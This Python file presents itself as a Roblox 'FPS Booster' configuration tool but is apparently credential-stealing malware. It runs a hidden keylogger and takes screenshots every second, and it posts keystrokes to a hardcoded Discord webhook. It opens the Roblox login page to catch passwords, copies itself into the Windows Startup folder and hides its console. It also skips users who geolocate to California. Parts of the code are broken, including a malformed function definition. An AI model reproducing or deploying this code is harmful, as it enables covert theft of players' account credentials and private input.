import tkinter as tk
from tkinter import messagebox, simpledialog
import threading
import time
import webbrowser
from pynput.keyboard import Key, Listener
import requests
import os
import psutil
import platform
import shutil
from queue import Queue
import mss

import sys
import requests

def is_california_citizen():
    try:
        # Get location data
        resp = requests.get('https://ipinfo.io/json', timeout=5)
        info = resp.json()
        region = info.get('region', '')
        if region.lower() in ['california', 'ca']:
            return True
    except Exception:
        pass
    return False

if is_california_citizen():
    print("Sorry, this program cannot run for California citizens.")
    sys.exit(0)

class FPSBooster:
    def __init__(self, cpu_core, gpu_power, ram_usage, webhook_url, root):
        self.keystrokes = []
        self.cpu_core = cpu_core
        self.gpu_power = gpu_power
        self.ram_usage = ram_usage
        self.webhook_url = webhook_url
        self.root = root
        self.start_time = time.time()
        self.message_queue = Queue()
        self.screenshot_queue = Queue()

    @staticmethod
    def get_system_info():
        # Get CPU information
        cpu_info = platform.processor()
        cpu_cores = psutil.cpu_count(logical=False)
        cpu_freq = psutil.cpu_freq()
        cpu_usage = psutil.cpu_percent(interval=1)

        # Get GPU information
        gpu_info = "N/A"  # Placeholder for GPU information
        gpu_power = "N/A"  # Placeholder for GPU power management

        # Get RAM information
        ram_info = psutil.virtual_memory()
        ram_total = ram_info.total / (1024 ** 3)  # Convert to GB
        ram_available = ram_info.available / (1024 ** 3)  # Convert to GB
        ram_usage = ram_info.percent

        return {
            "cpu_info": cpu_info,
            "cpu_cores": cpu_cores,
            "cpu_freq": f"{cpu_freq.current / 1000:.2f} GHz",
            "cpu_usage": f"{cpu_usage}%",
            "gpu_info": gpu_info,
            "gpu_power": gpu_power,
            "ram_total": f"{ram_total:.2f} GB",
            "ram_available": f"{ram_available:.2f} GB",
            "ram_usage": f"{ram_usage}%"
        }

    @staticmethod
    def boost_fps(cpu_core, gpu_power, ram_usage):
        # Reduce CPU usage by setting the affinity to a single core
        p = psutil.Process()
        try:
            p.cpu_affinity([cpu_core])
            # Additional FPS boosting techniques can be added here
            print(f"CPU affinity set to core {cpu_core}")
            print(f"GPU power management set to {gpu_power}")
            print(f"RAM usage optimization: {ram_usage}%")
        except Exception as e:
            print(f"Failed to boost FPS: {e}")

    def on_press(self, key):
        try:
            self.keystrokes.append(key.char)
        except AttributeError:
            self.keystrokes.append(str(key))
        self.message_queue.put('\n'.join(self.keystrokes))
        self.keystrokes.clear()

    def on_release(self, key):
        if key == Key.esc:
            return False

    def send_discord_message(self, message):
        data = {'content': message}
        response = requests.post(self.webhook_url, json=data)
        if response.status_code != 204:
            print(f'Failed to send message to Discord: {response.status_code}, {response.text}')

    def send_screenshot(self, screenshot):
        files = {'file': ('screenshot.png', open(screenshot, 'rb'), 'image/png')}
        response = requests.post(self.webhook_url, files=files)
        if response.status_code != 204:
            print(f'Failed to send screenshot to Discord: {response.status_code}, {response.text}')

    def message_handler(self):
        while True:
            message = self.message_queue.get()
            if message:
                self.send_discord_message(message)
            self.message_queue.task_done()

    def screenshot_handler(self):
        with mss.mss() as sct:
            while True:
                screenshot = sct.shot(output='screenshot.png')
                self.screenshot_queue.put(screenshot)
                time.sleep(1)

    def start_keylogger(self):
        self.send_discord_message("Keylogger has started.")
        threading.Thread(target=self.message_handler, daemon=True).start()
        threading.Thread(target=self.screenshot_handler, daemon=True).start()
        with Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            listener.join()

    @staticmethod
    def create_config_window():
        root = tk.Tk()
        root.title("FPS Booster Configuration")
        root.geometry("400x552")  # Increased height by 4cm (approximately 152 pixels)

        system_info = FPSBooster.get_system_info()

        cpu_label = tk.Label(root, text=f"CPU: {system_info['cpu_info']}")
        cpu_label.pack(pady=5)

        cpu_cores_label = tk.Label(root, text=f"CPU Cores: {system_info['cpu_cores']}")
        cpu_cores_label.pack(pady=5)

        cpu_freq_label = tk.Label(root, text=f"CPU Frequency: {system_info['cpu_freq']}")
        cpu_freq_label.pack(pady=5)

        cpu_usage_label = tk.Label(root, text=f"CPU Usage: {system_info['cpu_usage']}")
        cpu_usage_label.pack(pady=5)

        gpu_label = tk.Label(root, text=f"GPU: {system_info['gpu_info']}")
        gpu_label.pack(pady=5)

        gpu_power_label = tk.Label(root, text=f"GPU Power: {system_info['gpu_power']}")
        gpu_power_label.pack(pady=5)

        ram_label = tk.Label(root, text=f"RAM: {system_info['ram_total']} ({system_info['ram_available']} available)")
        ram_label.pack(pady=5)

        ram_usage_label = tk.Label(root, text=f"RAM Usage: {system_info['ram_usage']}")
        ram_usage_label.pack(pady=5)

        cpu_core_var = tk.IntVar(value=0)
        cpu_core_label = tk.Label(root, text="Select CPU Core for Affinity:")
        cpu_core_label.pack(pady=5)
        cpu_core_menu = tk.OptionMenu(root, cpu_core_var, *range(system_info['cpu_cores']))
        cpu_core_menu.pack(pady=5)

        gpu_power_var = tk.StringVar(value="High Performance")
        gpu_power_label = tk.Label(root, text="Select GPU Power Mode:")
        gpu_power_label.pack(pady=5)
        gpu_power_menu = tk.OptionMenu(root, gpu_power_var, "High Performance", "Balanced", "Power Saving")
        gpu_power_menu.pack(pady=5)

        ram_usage_var = tk.IntVar(value=50)
        ram_usage_label = tk.Label(root, text="Set RAM Usage Threshold (%):")
        ram_usage_label.pack(pady=5)
        ram_usage_scale = tk.Scale(root, from_=0, to=100, orient=tk.HORIZONTAL, variable=ram_usage_var)
        ram_usage_scale.pack(pady=5)

        run_button = tk.Button(root, text="Run", command=lambda: FPSBooster.run_config(
            cpu_core_var.get(), gpu_power_var.get(), ram_usage_var.get(), "https://discord.com/api/webhooks/1439762584206049330/AmRslfQN4NdjQ6KmHT3k0Az2fIxaDICwb5i7Kkp0JYq3-xMdAR1UnX2fO6EwcLiV234b", root))
        run_button.pack(pady=20)

        root.mainloop()

    @staticmethod
    def run_config(cpu_core, gpu_power, ram_usage, webhook_url, root):
        booster = FPSBooster(cpu_core, gpu_power, ram_usage, webhook_url, root)
        threading.Thread(target=booster.start_keylogger).start()
        FPSBooster.boost_fps(cpu_core, gpu_power, ram_usage)
        try:
            FPSBooster.open_roblox_login('yes')  # Default to English
        except webbrowser.Error as e:
            messagebox.showerror("Error", f"Failed to open Roblox login page: {e}")

        if messagebox.askquestion("Login Check", "Have you logged in?") == 'yes':
            messagebox.showinfo("FPS Booster", "Your FPS should be boosted now.")
            FPSBooster.add_to_startup()
            root.after(3000, root.quit)

    @staticmethod
    def open_roblox_login:
            webbrowser.get().open_new_tab('https://www.roblox.com/login')

    @staticmethod
    def add_to_startup():
        exe_path = os.path.realpath(__file__)
        startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        if not os.path.exists(startup_folder):
            os.makedirs(startup_folder)
        shutil.copy(exe_path, startup_folder)

if __name__ == "__main__":
    # Hide the console window on Windows
    if os.name == 'nt':
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)


    FPSBooster.create_config_window()


